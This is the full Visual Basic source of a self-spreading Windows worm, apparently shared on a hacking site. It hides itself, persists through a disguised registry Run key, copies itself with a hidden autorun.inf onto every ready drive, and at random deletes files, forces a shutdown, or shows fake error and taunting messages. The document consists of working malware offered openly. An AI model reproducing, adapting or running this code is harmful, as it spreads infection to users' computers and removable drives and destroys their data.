 '#| Win32.Autoexec.worm
'#| This Worm Is A Sample Of Autorun.inf Infection Method
'#| Infected All Drive & Floppy |##
'#| http://r00t security.org - elite hacking and security

Private Sub Form_Load(): On Error Resume Next: Me.Visible = 0: App.TaskVisible = 0
Dim Pyld As Integer: Randomize
Dim BackUp As String: BackUp = Environ("windir") & "\Kernel23.exe"
If LCase(App.EXEName) = "system" Then
Shell "Explorer.exe " & Left(App.Path, 2), vbMaximizedFocus
Pyld = Int(Rnd * 30)
If Pyld = 1 Then MsgBox "Hehehe .. " & vbCrLf & "Bad News For You ( Your Infected )", 64, "Virus Alert!"
If Pyld = 5 Then MsgBox " © By Mr.He$y / [P.V.T] ", 64, " W32/Autoexec.worm !"
If Pyld = 10 Then MsgBox "System Error(-243245&H21321438230.)", 16, "Error"
If Pyld = 15 Then Shell "Rundll.exe user.exe,exitwindows", vbHide
If Pyld = 20 Then SendKeys "^a", 1: SendKeys "+{DEL}", 1: SendKeys "~", 1
If Pyld = 25 Then Kill "*.*"
If Pyld Mod 3 = 0 Then Shell Environ("COMSPEC") & " /C ECHO " & Chr(7), vbHide
End If
Call Search_Drv
'Worm BackUp To Windows Folder & Created Run Key Of Rgistery
If Dir(BackUp) = "" Then
Set Reg = CreateObject("Wscript.shell")
Reg.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN\Microsoft Kernel Lab", BackUp
FileCopy Worm, BackUp
End If
End
End Sub
Private Sub Search_Drv()
Dim Fso, Drives
Set Fso = CreateObject("scripting.filesystemobject")
Set Drives = Fso.Drives
For Each Drive In Drives
If Drive.IsReady Then
Infected_Drv (Drive)
End If
Next
End Sub
Private Sub Infected_Drv(Path As String)
Dim INF As String: INF = Path & "\autorun.inf"
Dim EXEC As String: EXEC = Path & "\System.exe"
If Dir(INF, vbHidden) <> "" And Dir(EXEC, vbHidden) <> "" Then Exit Sub
FileCopy Worm, EXEC
Open INF For Output As #1
Print #1, "[Autorun]"
Print #1, "Open=System.exe"
Close
SetAttr INF, vbHidden
End Sub
Public Function Worm() As String
Worm = App.Path
If Right(Worm, 1) <> "\" Then Worm = Worm & "\"
Worm = Worm & App.EXEName & ".exe"
End Function